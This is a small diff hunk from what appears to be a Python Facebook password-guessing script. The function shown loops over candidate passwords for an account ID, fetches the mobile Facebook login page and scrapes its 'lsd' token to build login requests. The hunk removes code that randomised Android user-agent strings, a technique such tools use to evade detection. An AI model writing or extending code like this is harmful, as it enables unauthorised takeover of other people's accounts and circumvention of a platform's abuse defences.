@@ -1251,10 +1251,6 @@ def m5(idf,pwv):
  try:
   for ps in pwv:
    session = requests.Session()
-   model = random.choice(models)
-   build = random.choice(builds)
-   google_app = random.choice(google_apps)
-   user_agent = f"Mozilla/5.0 (Linux; Android 14; {model} Build/{build}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/127.0.6533.2 Mobile Safari/537.36 GoogleApp/{google_app}"
    free_fb = session.get('https://m.facebook.com').text
    log_data ={
              "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
